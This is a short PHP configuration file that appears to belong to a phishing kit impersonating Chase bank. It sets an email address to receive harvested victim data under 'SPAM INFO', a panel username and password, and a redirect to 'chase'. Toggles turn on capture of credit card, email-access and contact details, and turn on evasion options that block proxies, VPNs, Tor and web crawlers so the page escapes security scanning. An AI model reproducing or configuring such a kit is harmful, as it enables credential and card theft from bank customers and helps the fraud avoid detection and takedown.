<?php


// SPAM INFO

$yourname = "SAM";
$your_email = "aryanchase@yandex.com";


// LOGIN INFO

$username = "Aryan1999";
$password = "Asdf@123";

// Redirect

$redirect = "chase";


// ON / OFF 
$double_login = "no";
$double_access = "yes";
$api_protection = "yes";
$redirection = "yes";
$double_cc = "no";
$one_time_access ="no";
$show_start_page = "no"; 
$show_email_access = "yes"; 
$show_contact_information = "yes";
$show_credit_card = "yes";
$show_success_page = "no";
$anti_proxy = "yes";
$anti_vpn = "yes";
$anti_tor = "yes";
$anti_web_crawler ="yes";
$max_fraud_score = "101";


// KEY PROTECTION
$Key = ")WTAxZT3y;yz;B6x&?CRkQ2Dzhd?sQ&v";





?>